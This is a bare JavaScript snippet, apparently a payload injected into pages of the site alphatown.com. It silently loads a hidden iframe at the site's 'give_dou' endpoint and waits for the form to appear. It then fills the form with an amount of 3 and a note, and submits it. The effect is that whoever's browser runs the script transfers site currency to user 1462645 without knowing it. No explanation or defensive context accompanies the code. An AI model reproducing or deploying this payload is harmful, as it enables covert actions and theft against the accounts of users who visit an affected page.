var f=$("<iframe>").appendTo("body").hide().attr("src","http://alphatown.com/api/user/1462645/give_dou?needauth=1"),
    form, timer;
timer = setInterval(function(){
    form=f[0].contentWindow.document.getElementsByTagName("form")[0];
    if(!form){
        return;
    }
    clearInterval(timer);
    timer = null;
    form.amount.value=3;
    form.note.value="hei";
    form.submit();
},1000);